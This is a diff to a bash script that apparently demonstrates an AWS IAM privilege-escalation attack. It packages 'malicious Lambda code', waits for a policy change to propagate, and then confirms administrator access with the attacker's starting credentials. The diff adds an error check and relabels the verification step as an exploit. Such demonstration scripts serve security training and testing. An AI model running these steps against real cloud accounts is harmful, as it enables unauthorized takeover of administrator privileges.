@@ -218,6 +218,10 @@ EOF
 # Create zip file
 cd /tmp
 zip -q lambda_function.zip lambda_function.py
+if [ $? -ne 0 ] || [ ! -f /tmp/lambda_function.zip ]; then
+    echo -e "${RED}Error: Failed to create lambda_function.zip${NC}"
+    exit 1
+fi
 cd - > /dev/null
 
 echo -e "${GREEN}✓ Created malicious Lambda code${NC}\n"
@@ -289,12 +293,12 @@ echo -e "${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# [OBSERVATION] Step 11: Verify administrator access
+# [EXPLOIT] Step 11: Verify administrator access with starting user credentials
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
-use_readonly_creds
-echo "Attempting to list IAM users..."
+use_starting_creds
+echo "Attempting to list IAM users with starting user credentials..."
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
